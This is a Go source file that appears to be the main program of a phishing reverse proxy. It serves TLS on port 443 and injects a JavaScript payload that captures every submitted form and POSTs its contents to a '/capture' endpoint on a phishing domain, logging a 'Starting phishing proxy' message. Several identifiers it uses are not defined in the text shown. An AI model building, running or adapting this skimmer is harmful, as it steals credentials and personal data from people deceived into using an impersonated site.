package main

import (
	"crypto/tls"
	"flag"
	"log"
	"net/http"
)

const (
	certFile = "certs/cert.pem"
	keyFile  = "certs/key.pem"
)

func createServer(handler http.Handler) *http.Server {

	// Configure server's TLS configurations
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12, // Modern TLS 1.2+ Security
		NextProtos: []string{"http/1.1"},

		// Modern elliptic curves for ECDHE
		CurvePreferences: []tls.CurveID{
			tls.CurveP256,
			tls.X25519,
		},
		// Strong AEAD ciphers
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,   // Required for HTTP/2
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, // Required for HTTP/2
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
	}

	return &http.Server{
		Addr:      ":443",
		Handler:   handler,
		TLSConfig: tlsConfig,
	}
}

func main() {
	flag.Parse()

	// Initialize JS payload with phishing domain
	jsPayload = `document.addEventListener('submit', function(e) {
		fetch('//` + phishingDomain + `/capture', {
			method: 'POST',
			body: JSON.stringify(Array.from(new FormData(e.target))
		});
	});`

	proxy := createProxy()
	server := createServer(proxy)

	log.Printf("Starting phishing proxy:\nTarget: %s\nPhishing: %s\nLog Level: %v",
		targetDomain, phishingDomain, verbosity)

	log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
}
